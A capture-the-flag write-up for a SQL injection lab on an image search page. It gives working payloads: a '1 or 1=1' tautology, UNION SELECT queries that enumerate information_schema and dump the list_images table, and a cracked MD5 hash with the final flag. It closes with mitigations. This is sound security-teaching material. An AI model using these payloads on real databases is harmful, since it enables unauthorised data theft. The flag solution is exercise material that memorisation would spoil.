# SQL_Injection_images

## Description

A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

## Do_similary_thing_like_SQL_injection_members

    # input:
    1 or 1=1

    # result:
    ID: 1 or 1=1 
    Title: Hack me ?
    Url : borntosec.ddns.net/images.png

## Step_2

    # input:
    1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database()

    # result:
    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : id

    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : url

    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : title

    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : comment

## Step_3

    # input:
    1 or 1=1 union select null, concat(id, url, title, comment) from list_images 

    # result:
    Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

## Get_the_flag

    1928e8083cf461a51303633093573c46 -> MD5 hash -> after crack -> albatroz
    albatroz -> ater SHA256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Solutions

    - Use of Prepared Statements
    - Allow-list Input Validation
    - Escaping All User Supplied Input